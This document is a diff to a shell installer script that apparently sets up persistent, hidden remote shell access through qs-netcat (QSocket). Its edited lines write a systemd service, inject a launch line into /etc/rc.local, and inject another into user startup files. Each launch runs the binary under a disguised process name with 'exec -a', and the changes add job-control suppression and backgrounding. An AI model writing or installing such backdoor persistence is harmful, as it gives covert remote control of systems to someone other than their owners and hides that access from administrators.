@@ -307,7 +307,7 @@ Type=simple
 Restart=always
 RestartSec=10
 WorkingDirectory=/root
-ExecStart=/bin/bash -c \"pidof $QS_PATH|| QS_ARGS='-l -i -q -s $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\"
+ExecStart=/bin/bash -c \"pidof $QS_PATH|| QS_ARGS='-liqs $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\"
  
 [Install]
 WantedBy=multi-user.target" >"${SERVICE_FILE}"
@@ -322,7 +322,7 @@ install_system_rclocal(){
 	if grep -q "QS_ARGS" "${RCLOCAL_FILE}" &>$ERR_LOG; then
 		print_error "Already installed in ${RCLOCAL_FILE}." && return 0
 	fi
-	RCLOCAL_LINE="HOME=\"$HOME\" TERM=xterm-256color SHELL=\"$SHELL\" QS_ARGS=\"-l -i -q -s $S\" $(command -v bash) -c \"pidof ${QS_PATH}||cd /root; exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null"
+	RCLOCAL_LINE="set +m; HOME=\"$HOME\" TERM=xterm-256color SHELL=\"$SHELL\" QS_ARGS=\"-liqs $S\" $(command -v bash) -c \"cd $HOME; exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null &"
 	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
 	# Thus we need to start /bin/bash -c in a sub-shell before 'exec qs-netcat'.
 	inject_to_file "${RCLOCAL_FILE}" "$RCLOCAL_LINE"
@@ -340,7 +340,7 @@ install_user() {
 	)
 	
 	local success=""
-	INJECT_LINE="HOME=$HOME TERM=\"xterm-256color\" SHELL=\"$SHELL\" QS_ARGS=\"-l -i -q -s $S\" $(command -v bash) -c \"pidof ${QS_PATH}||exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null &"
+	INJECT_LINE="set +m; HOME=$HOME TERM=\"xterm-256color\" SHELL=\"$SHELL\" QS_ARGS=\"-liqs $S\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null &"
 	for target in ${inject_targets[@]}; do
 		grep -q QS_ARGS $target &>$ERR_LOG && print_status "!! WARNING !! QSocket access already installed via `basename $target`" && continue 
 		[[ ! -f $target ]] && continue
